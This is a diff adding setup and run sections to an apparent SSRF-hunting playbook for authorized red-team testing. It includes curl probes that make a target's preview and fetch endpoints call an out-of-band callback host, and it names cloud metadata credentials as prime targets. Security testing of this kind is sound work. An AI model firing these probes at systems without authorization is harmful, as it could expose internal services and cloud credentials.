@@ -12,6 +12,32 @@ tags: [ssrf, hunt, redteam]
 
 Use when the target has any feature that fetches a URL, imports data from a remote source, generates previews/screenshots, processes webhooks, or renders documents. SSRF allows an attacker to make the server itself perform network requests — reaching internal services, cloud metadata endpoints, and otherwise inaccessible infrastructure. Every link-preview, file-import, image-proxy, webhook-registration, PDF-generation, and redirect-following endpoint is a candidate. Highest-value targets: cloud-hosted SaaS, Kubernetes/orchestration platforms, CI/CD systems, and URL-fetching features.
 
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `ffuf`, `interactsh-client`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Using interactsh-client
+interactsh-client -v
+
+# Test parameter
+curl --max-time 30 --connect-timeout 10 -s "https://target.com/api/preview?url=https://YOUR_ID.oast.pro"
+
+# With common headers that might unlock SSRF
+curl --max-time 30 --connect-timeout 10 -s "https://target.com/api/fetch" \
+  -H "Content-Type: application/json" \
+  -d '{"url":"https://YOUR_ID.oast.pro"}'
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
+
 ## Crown Jewel Targets
 
 SSRF is highest-value when the target runs on cloud infrastructure (AWS, GCP, Azure) where metadata services expose credentials, or when the server sits inside a complex internal network (Kubernetes clusters, microservice meshes, internal APIs). Priority targets:
